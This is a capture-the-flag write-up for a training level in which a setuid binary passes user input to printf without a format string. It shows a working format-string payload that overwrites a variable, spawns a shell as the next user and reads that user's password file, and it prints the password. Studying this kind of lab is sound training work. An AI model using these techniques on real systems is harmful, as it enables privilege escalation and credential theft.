# Level3

## 1. Context

```bash
$ id
uid=2022(level3) gid=2022(level3) groups=2022(level3),100(users)

$ pwd
/home/user/level3

$ ls -la
[...]
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
[...]
```

## 2. Program behavior

Testing it :
```bash
$ ./level3
a
a
```

Expects an input and prints it, nothing else...

## 3. Code overview

Looking at our functions, `main()` calls the function `v()`.
`v()` uses the function `gets()` which is vulnerable to **buffer overflows**.
Our function also uses `printf()` wihtout any format string, meaning that our code is vulnerable to **format string attacks**.
Then checks the value of `m`. If `m` equals `64`, a shell is launched.

## 4. Exploit

Our goal is to modify the value of `m`.

The address of `m` is : `"\x8c\x98\x04\x08"`

Using a format string attack to check where our buffer is :
```bash
$ python -c "print 'BBBB %x %x %x %x %x %x'" | ./level3 
BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825
```

Our buffer is stored in the 4th position in the stack.

## 5. Getting the flag

```bash
$ (python -c 'print "\x8c\x98\x04\x08"+"B"*60+"%4$n"'; cat -) | ./level3
�BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Wait what?!
whoami
level4
cat /home/user/level4/.pass    
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36f
```

End of simulation
